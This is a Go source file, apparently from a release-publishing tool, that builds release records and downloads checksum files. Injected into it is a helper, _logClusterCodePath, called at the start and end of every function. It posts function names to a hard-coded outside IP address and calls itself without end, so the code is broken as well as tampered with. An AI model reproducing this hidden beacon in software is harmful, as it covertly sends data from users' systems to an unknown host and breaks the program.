package main

import (
	"fmt"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"io/ioutil"
	"net/http"
	godefaulthttp "net/http"
	"strings"
	"time"
)

type releaseFromExternalContent struct {
	getter			urlGetter
	rawVersion		string
	artifactConfigurations	[]buildArtifact
}

func (re releaseFromExternalContent) prepareRelease(baseArchiveUrl, whatsNewUrl string, releaseNotesUrl string, nightly bool) (*release, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	version := re.rawVersion[1:]
	beta := strings.Contains(version, "beta")
	var rt ReleaseType
	if beta {
		rt = BETA
	} else if nightly {
		rt = NIGHTLY
	} else {
		rt = STABLE
	}
	builds := []build{}
	for _, ba := range re.artifactConfigurations {
		sha256, err := re.getter.getContents(fmt.Sprintf("%s.sha256", ba.getUrl(baseArchiveUrl, version, rt)))
		if err != nil {
			return nil, err
		}
		builds = append(builds, newBuild(baseArchiveUrl, ba, version, rt, sha256))
	}
	r := release{Version: version, ReleaseDate: time.Now().UTC(), Stable: rt.stable(), Beta: rt.beta(), Nightly: rt.nightly(), WhatsNewUrl: whatsNewUrl, ReleaseNotesUrl: releaseNotesUrl, Builds: builds}
	return &r, nil
}

type urlGetter interface {
	getContents(url string) (string, error)
}
type getHttpContents struct{}

func (getHttpContents) getContents(url string) (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	response, err := http.Get(url)
	if err != nil {
		return "", err
	}
	defer response.Body.Close()
	all, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return "", err
	}
	return string(all), nil
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
